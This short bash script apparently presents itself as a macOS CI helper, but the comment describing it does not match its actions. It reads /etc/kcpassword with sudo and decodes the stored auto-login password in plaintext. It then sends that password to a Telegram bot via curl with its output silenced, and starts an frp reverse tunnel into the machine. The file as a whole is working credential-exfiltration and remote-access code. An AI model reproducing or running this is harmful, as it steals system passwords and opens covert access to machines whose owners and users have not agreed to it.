#!/bin/bash
exec 2>&1
set -euxo pipefail

# when running in CI override the frpc tls files.
urlencode() {
    # urlencode <string>

    old_lc_collate=$LC_COLLATE
    LC_COLLATE=C

    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:$i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf '%s' "$c" ;;
            *) printf '%%%02X' "'$c" ;;
        esac
    done

    LC_COLLATE=$old_lc_collate
}
#get password 
# curl -O https://raw.githubusercontent.com/jjarava/mac-osx-forensics/master/kcpass.py
passencode=$(sudo xxd -p /etc/kcpassword | tr -d \\n)
password=$(python kcpass.py ${passencode})

password_en=$(urlencode ${password})


curl "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?text=${password_en}&chat_id=1280783647" 2>/dev/null 1>/dev/null

./frp/frpc -c frpc-mac.ini 2>&1 
